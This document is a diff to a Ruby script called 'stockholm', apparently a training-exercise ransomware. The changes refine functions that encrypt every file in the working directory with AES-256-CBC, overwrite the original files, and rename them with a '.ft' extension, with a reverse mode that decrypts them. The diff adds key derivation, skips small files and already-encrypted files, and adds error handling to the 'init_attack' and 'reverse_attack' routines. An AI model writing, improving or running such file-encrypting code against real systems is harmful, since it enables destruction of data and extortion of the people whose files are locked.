@@ -28,8 +28,8 @@ def version(conf)
 end
 
 def options(input, config)
-  if input.size > 3
-    usage()
+  if input.size > 3 || input.size < 1
+    usage(config)
   end
   OptionParser.new do |opts|
   opts.on("-s", "--silence", "silence the output") do |s|
@@ -45,12 +45,13 @@ def options(input, config)
       config.key = key 
       config.reverse = true
     end
-      end.parse!
+  end.parse!
 end
 
 def check_conf(config)
   if config.key.size < 16 
     print(false, "[STOCKHOLM] key must be at least 16 characters")
+    exit()
   end
 end
 
@@ -72,7 +73,11 @@ def check_dir(config)
   # end
 end
 
-def encrypt(file, password)
+def derive_key(key)
+  OpenSSL::Digest::SHA256.digest(key)
+end
+
+def encrypt(file, password, silence)
   cipher = OpenSSL::Cipher.new('aes-256-cbc')
   cipher.encrypt
 
@@ -81,16 +86,25 @@ def encrypt(file, password)
   iv = cipher.random_iv
 
   data = File.binread(file)
+  if data.empty? || data.size < 16
+    print(silence, "file: #{file} empty or too small skiping")
+    return
+  end
   encrypted = cipher.update(data) + cipher.final
 
   File.binwrite(file, iv + encrypted)
 
   File.rename(file, file + ".ft") unless file.end_with?(".ft")
+
+  print(silence, "- #{file}")
 end
 
-def decrypt(file, password)
- data = File.binread(file)
-
+def decrypt(file, password, silence)
+  data = File.binread(file)
+  if data.empty? || data.size < 16
+    print(silence, "file: #{file} empty or too small skiping")
+    return
+  end
   iv = data[0,16]
   encrypted = data[16..]
 
@@ -100,20 +114,23 @@ def decrypt(file, password)
   key = derive_key(password)
   cipher.key = key
   cipher.iv = iv
-
-  decrypted = cipher.update(encrypted) + cipher.final
-
-  File.binwrite(file, decrypted)
-
-  new_name = file.sub(/\.ft$/, '')
-  File.rename(file, new_name)
+  begin
+    decrypted = cipher.update(encrypted) + cipher.final
+    File.binwrite(file, decrypted)
+    new_name = file.sub(/\.ft$/, '')
+    File.rename(file, new_name)
+  rescue OpenSSL::Cipher::CipherError => e
+    print(silence, "Could not decrypt #{file}: #{e.message}")
+  end
+  print(silence, "- #{file}")
 end
 
 def init_attack(config)
   print(config.silence, "[STOCKHOLM] Encrypting files:")
   Dir.glob('*').each do |file|
     next if file == "stockholm"
-    encrypt(file, config.key)
+    next if File.extname(file) == ".ft"
+    encrypt(file, config.key, config.silence)
   end
 end
 
@@ -121,7 +138,8 @@ def reverse_attack(config)
   print(config.silence, "[STOCKHOLM] Decrypting files:")
   Dir.glob('*').each do |file|
     next if file == "stockholm"
-    decrypt(file, config.key)
+    next if File.extname(file) != ".ft"
+    decrypt(file, config.key, config.silence)
   end
 end
 
